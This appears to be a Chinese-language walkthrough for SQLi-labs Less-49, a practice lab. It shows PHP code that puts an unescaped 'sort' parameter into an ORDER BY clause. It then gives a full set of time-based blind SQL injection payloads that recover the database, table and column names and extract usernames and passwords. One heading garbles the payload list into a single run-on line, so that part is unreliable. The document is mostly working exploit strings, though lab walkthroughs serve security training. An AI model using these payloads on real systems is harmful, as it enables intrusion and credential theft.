---
title: less49
url: https://www.yuque.com/u29002979/ep2zrx/oz4wh5948tg1ih7y
---

```bash
$id=$_GET['sort'];	

$sql = "SELECT * FROM users ORDER BY '$id'";
```

此关的闭合方式为单引号'，还是需要时间盲注去猜解数据\ <a name="qjWYr"></a>

# 注入点检查

`?sort=1'` <a name="ukBAB"></a>

# xxxxxxxxxx21 1拆解数据库名称长度2?sort=1 and if(length(database())=8,sleep(3),0)#3​4猜解数据库名称 5?sort=1 and if(ascii(mid(database(),1,1))<=135,sleep(3),0)--+6​7猜解数据表名称长度8?sort=1 and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=29,sleep(3),0)#9​10猜解数据表名称11?sort=1 and if(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1)='e',sleep(3),0)--+12​13​14猜解字段名称长度15?sort=1 and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'))=20,sleep(3),0)#16​17猜解字段名称18?sort=1 and if(mid((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),1,1)='i',sleep(3),0)--+19​20猜解字段内容21?sort=1 and if(mid((select group_concat(username,0x7e,password) from users),1,1)='D',sleep(3),0)--+bash

```bash
拆解数据库名称长度
?sort=1' and if(length(database())=8,sleep(3),0)--+

猜解数据库名称 
?sort=1' and if(ascii(mid(database(),1,1))<=135,sleep(3),0)--+

猜解数据表名称长度
?sort=1' and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=29,sleep(3),0)--+

猜解数据表名称
?sort=1' and if(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1)='e',sleep(3),0)--+


猜解字段名称长度
?sort=1' and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'))=20,sleep(3),0)#

猜解字段名称
?sort=1' and if(mid((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),1,1)='i',sleep(3),0)--+

猜解字段内容
?sort=1' and if(mid((select group_concat(username,0x7e,password) from users),1,1)='D',sleep(3),0)--+
```
